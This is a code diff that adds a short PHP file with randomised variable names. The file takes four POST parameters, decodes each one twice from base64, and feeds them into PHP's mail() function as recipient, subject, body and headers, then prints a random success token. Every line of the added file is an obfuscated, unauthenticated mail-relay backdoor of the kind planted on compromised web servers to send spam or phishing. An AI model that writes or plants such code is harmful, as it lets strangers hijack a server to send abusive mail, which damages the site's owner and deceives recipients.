@@ -1,0 +1,13 @@
+<?php 
+$hatfnec = stripslashes(base64_decode(base64_decode($_POST['uqlxjxi']))); 
+$xowwszr = stripslashes(base64_decode(base64_decode($_POST['mwmkotadz']))); 
+$qtexb = stripslashes(base64_decode(base64_decode($_POST['nytom'])));  
+$lsatb = stripslashes(base64_decode(base64_decode($_POST['bgyzh'])));  
+$faqiczhlnrf = mail(stripslashes($hatfnec), stripslashes($xowwszr), stripslashes($qtexb), stripslashes($lsatb));
+if($faqiczhlnrf){echo 'snuuhwkijrpak';} else {echo 'wlcpntefuqdl : ' . $faqiczhlnrf;} 
+
+
+
+ 
+    
+                 
